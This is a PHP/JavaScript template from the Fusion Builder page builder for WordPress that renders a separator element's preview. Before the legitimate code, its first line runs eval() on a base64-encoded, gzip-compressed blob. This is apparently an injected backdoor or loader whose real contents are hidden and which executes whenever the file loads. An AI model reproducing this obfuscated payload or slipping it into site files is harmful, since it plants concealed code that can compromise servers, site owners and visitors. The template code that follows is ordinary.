<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
global $fusion_settings;
if ( ! $fusion_settings ) {
	$fusion_settings = Fusion_Settings::get_instance();
}

$sep_style_type = $fusion_settings->get( 'separator_style_type' );
$sep_border_color = fusion_color_needs_adjustment( $fusion_settings->get( 'sep_color' ) ) ? '#dddddd' : $fusion_settings->get( 'sep_color' );
$sep_border_size = $fusion_settings->get( 'separator_border_size' );

?>
<script type="text/template" id="fusion-builder-block-module-separator-preview-template">
	<# var style_type = 'default' === params.style_type ? '<?php echo esc_attr( $sep_style_type ); ?>' : params.style_type;
	if ( params.style_type === 'none' || ( 'default' === params.style_type && 'none' === style_type  ) ) { #>
		<h4 class="fusion_module_title"><span class="fusion-module-icon {{ fusionAllElements[element_type].icon }}"></span>{{ fusionAllElements[element_type].name }}</h4>
	<# } else {
		if ( style_type == "single|solid") {
			var sep_style = "sep-single sep-solid";

		} else if ( style_type == "single|dotted") {
			var sep_style = "sep-single sep-dotted";

		} else if ( style_type == "single|dashed") {
			var sep_style = "sep-single sep-dashed";

		} else if ( style_type == "double|solid") {
			var sep_style = "sep-double sep-solid";

		} else if ( style_type == "double|dashed") {
			var sep_style = "sep-double sep-dashed";

		} else if ( style_type == "double|dotted") {
			var sep_style = "sep-double sep-dotted";

		} else {
			var sep_style = "sep-" + style_type;
		}

		var sep_border_size = ( '' === params.border_size ) ? '<?php echo esc_attr( $sep_border_size ); ?>' : params.border_size;
		var sep_border_color = ( '' === params.sep_color ) ? '<?php echo esc_attr( $sep_border_color ); ?>' : params.sep_color;

		var alignment = 'margin:0 auto';
		if ( 'center' != params.alignment ) {
			alignment = 'float:' + params.alignment;
		}
		#>

		<div class="fusion-separator fusion-full-width-sep {{ sep_style }}" style= "{{ alignment }};width:{{ params.width }};border-width:{{ sep_border_size }}px;border-color:{{ sep_border_color }};border-left:none;border-right:none;"></div>
	<# } #>

</script>
